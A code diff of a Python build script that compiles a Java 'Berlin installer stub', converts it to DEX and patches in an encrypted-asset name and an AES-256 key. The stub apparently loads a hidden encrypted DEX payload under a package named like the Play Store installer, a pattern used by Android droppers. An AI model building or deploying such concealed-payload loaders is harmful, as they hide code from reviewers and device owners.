@@ -2,25 +2,25 @@
 """
 build_stub_dex.py
 
-Builds the Berlin installer stub classes.dex from BerlinStubLoader.kt.
+Builds the Berlin installer stub classes.dex from BerlinStubLoader.java.
+Pure Java — zero Kotlin stdlib dependency. No kotlinc required.
 Patches BERLIN_DEX_ASSET and BERLIN_DEX_KEY directly into the DEX byte arrays.
 
 Flow:
-  1. Compile BerlinStubLoader.kt → .jar using kotlinc
-  2. Convert .jar → classes.dex using d8
+  1. Compile BerlinStubLoader.java → .class using javac
+  2. Convert .class → classes.dex using d8
   3. Patch asset name  (marker: 32 × 0xAB) with actual BERLIN_DEX_ASSET
   4. Patch AES-256 key (marker: 64 × 0xCD) with actual BERLIN_DEX_KEY hex
   5. Write patched classes.dex to output path
 
 Usage:
     python3 build_stub_dex.py \\
-        <stub_kt_path>         path to BerlinStubLoader.kt
+        <stub_java_path>       path to BerlinStubLoader.java
         <output_dex_path>      where to write patched classes.dex
         <berlin_dex_asset>     e.g. "d4f9a2c1.bin"  (≤31 chars)
         <berlin_dex_key_hex>   64-char hex AES-256 key
         <android_jar_path>     path to android.jar (e.g. $ANDROID_HOME/platforms/android-34/android.jar)
         [d8_path]              optional: path to d8 binary (default: auto-detect from $ANDROID_HOME)
-        [kotlinc_path]         optional: path to kotlinc binary (default: kotlinc on PATH)
 """
 
 import os
@@ -56,19 +56,23 @@ def find_d8(android_home: str) -> str:
     sys.exit("ERROR: d8 not found. Pass d8_path or ensure ANDROID_HOME/build-tools/*/d8 exists.")
 
 
-def find_kotlinc(kotlinc_path: str = None) -> str:
-    if kotlinc_path and os.path.isfile(kotlinc_path):
-        return kotlinc_path
-    kc = shutil.which("kotlinc")
-    if kc:
-        return kc
-    sys.exit("ERROR: kotlinc not found. Install Kotlin or pass kotlinc_path.")
+def find_javac() -> str:
+    # Prefer JAVA_HOME/bin/javac, then PATH
+    java_home = os.environ.get("JAVA_HOME", "")
+    if java_home:
+        candidate = os.path.join(java_home, "bin", "javac")
+        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
+            return candidate
+    jc = shutil.which("javac")
+    if jc:
+        return jc
+    sys.exit("ERROR: javac not found. Ensure JDK is installed and on PATH or JAVA_HOME is set.")
 
 
 def patch_marker(dex: bytes, marker: bytes, value: bytes, label: str) -> bytes:
     idx = dex.find(marker)
     if idx == -1:
-        sys.exit(f"ERROR: Marker {label} not found in DEX. Was BerlinStubLoader.kt compiled correctly?")
+        sys.exit(f"ERROR: Marker {label} not found in DEX. Was BerlinStubLoader.java compiled correctly?")
     if len(value) > len(marker):
         sys.exit(f"ERROR: {label} value ({len(value)} bytes) exceeds marker size ({len(marker)} bytes).")
     # Patch: write value bytes, pad remainder with 0x00
@@ -91,21 +95,20 @@ def main():
     if len(sys.argv) < 6:
         sys.exit(
             f"Usage: {sys.argv[0]} "
-            "<stub_kt_path> <output_dex_path> <berlin_dex_asset> "
-            "<berlin_dex_key_hex> <android_jar_path> [d8_path] [kotlinc_path]"
+            "<stub_java_path> <output_dex_path> <berlin_dex_asset> "
+            "<berlin_dex_key_hex> <android_jar_path> [d8_path]"
         )
 
-    stub_kt       = Path(sys.argv[1])
+    stub_java     = Path(sys.argv[1])
     output_dex    = Path(sys.argv[2])
     asset_name    = sys.argv[3].strip()
     key_hex       = sys.argv[4].strip()
     android_jar   = sys.argv[5].strip()
     d8_path       = sys.argv[6] if len(sys.argv) > 6 else None
-    kotlinc_path  = sys.argv[7] if len(sys.argv) > 7 else None
 
     # Validate
-    if not stub_kt.exists():
-        sys.exit(f"ERROR: Stub Kotlin file not found: {stub_kt}")
+    if not stub_java.exists():
+        sys.exit(f"ERROR: Stub Java file not found: {stub_java}")
     if not os.path.isfile(android_jar):
         sys.exit(f"ERROR: android.jar not found: {android_jar}")
     if len(key_hex) != 64:
@@ -115,73 +118,50 @@ def main():
         sys.exit(f"ERROR: asset_name too long ({len(asset_bytes)} bytes, max 31).")
     key_bytes_utf8 = key_hex.encode("utf-8")  # 64 ASCII chars = 64 bytes
 
-    kotlinc = find_kotlinc(kotlinc_path)
-    d8      = find_d8(os.environ.get("ANDROID_HOME", os.environ.get("ANDROID_SDK_ROOT", ""))) \
-              if not d8_path else d8_path
+    javac = find_javac()
+    d8    = find_d8(os.environ.get("ANDROID_HOME", os.environ.get("ANDROID_SDK_ROOT", ""))) \
+            if not d8_path else d8_path
 
-    print(f"[build_stub_dex] kotlinc       : {kotlinc}")
+    print(f"[build_stub_dex] javac         : {javac}")
     print(f"[build_stub_dex] d8            : {d8}")
     print(f"[build_stub_dex] android.jar   : {android_jar}")
     print(f"[build_stub_dex] Asset name    : {asset_name}")
     print(f"[build_stub_dex] Key           : {key_hex[:16]}...")
-    print(f"[build_stub_dex] Stub source   : {stub_kt}")
+    print(f"[build_stub_dex] Stub source   : {stub_java}")
     print(f"[build_stub_dex] Output DEX    : {output_dex}")
 
     with tempfile.TemporaryDirectory() as tmpdir:
         tmp = Path(tmpdir)
-        jar_out = tmp / "stub.jar"
+        classes_dir = tmp / "stub_classes"
+        classes_dir.mkdir()
         dex_dir = tmp / "dex_out"
         dex_dir.mkdir()
 
-        # Step 1: kotlinc → .jar (with -include-runtime so built-in types resolve)
-        # We strip stdlib classes before passing to d8, but we must compile with
-        # -include-runtime because -no-stdlib also removes built-in kotlin types
-        # (Int, ByteArray, String etc.) from the compiler, causing compile errors.
-        print("[build_stub_dex] Compiling Kotlin → JAR ...")
+        # Step 1: javac → .class files
+        # Pure Java — zero Kotlin stdlib. No runtime library needed beyond android.jar.
+        print("[build_stub_dex] Compiling Java → .class ...")
         result = subprocess.run(
             [
-                kotlinc,
-                str(stub_kt),
+                javac,
+                "-source", "8",
+                "-target", "8",
                 "-classpath", android_jar,
-                "-include-runtime",
-                "-d", str(jar_out),
-                "-jvm-target", "1.8",
-                "-nowarn",
+                "-d", str(classes_dir),
+                str(stub_java),
             ],
             capture_output=True, text=True
         )
         if result.returncode != 0:
             print(result.stdout)
             print(result.stderr)
-            sys.exit(f"ERROR: kotlinc failed (exit {result.returncode})")
-        print(f"[build_stub_dex] JAR built     : {jar_out} ({jar_out.stat().st_size:,} bytes)")
+            sys.exit(f"ERROR: javac failed (exit {result.returncode})")
 
-        # Step 1b: Extract stub class files + minimal Intrinsics shim from the JAR.
-        # The Kotlin compiler emits calls to kotlin.jvm.internal.Intrinsics for
-        # null/param checks. We bundle only the shim (not the full stdlib) so
-        # the DEX is tiny but Intrinsics calls resolve at runtime without crashing.
-        import zipfile
-        classes_dir = tmp / "stub_classes"
-        classes_dir.mkdir()
-        with zipfile.ZipFile(jar_out, "r") as zf:
-            extracted = []
-            for name in zf.namelist():
-                keep = (
-                    # Stub class itself
-                    (name.startswith("com/playstore/installer/BerlinAppEntry") and name.endswith(".class"))
-                    or
-                    # Minimal Intrinsics shim — only the Intrinsics class, nothing else from stdlib
-                    name == "kotlin/jvm/internal/Intrinsics.class"
-                )
-                if keep:
-                    dest = classes_dir / name
-                    dest.parent.mkdir(parents=True, exist_ok=True)
-                    dest.write_bytes(zf.read(name))
-                    extracted.append(str(dest))
+        # Collect all .class files produced
+        extracted = [str(f) for f in classes_dir.rglob("*.class")]
         stub_classes = [f for f in extracted if "BerlinAppEntry" in f]
         if not stub_classes:
-            sys.exit("ERROR: BerlinAppEntry.class not found in JAR. Check package name in BerlinStubLoader.kt.")
-        print(f"[build_stub_dex] Extracted {len(extracted)} class file(s) for DEX compilation")
+            sys.exit("ERROR: BerlinAppEntry.class not found after javac. Check class name in BerlinStubLoader.java.")
+        print(f"[build_stub_dex] Compiled {len(extracted)} class file(s) for DEX compilation")
 
         # Step 2: d8 → classes.dex (only stub class files, NOT the full JAR)
         print("[build_stub_dex] Converting stub classes → DEX ...")
@@ -207,7 +187,7 @@ def main():
         dex_size = dex_file.stat().st_size
         print(f"[build_stub_dex] DEX built     : {dex_file} ({dex_size:,} bytes)")
         if dex_size > 200_000:
-            sys.exit(f"ERROR: Stub DEX too large ({dex_size:,} bytes, max 200KB). Kotlin runtime was bundled — fix kotlinc flags.")
+            sys.exit(f"ERROR: Stub DEX too large ({dex_size:,} bytes, max 200KB). Check BerlinStubLoader.java for unexpected dependencies.")
 
         # Step 3: Patch asset name marker (32 × 0xAB)
         dex = dex_file.read_bytes()
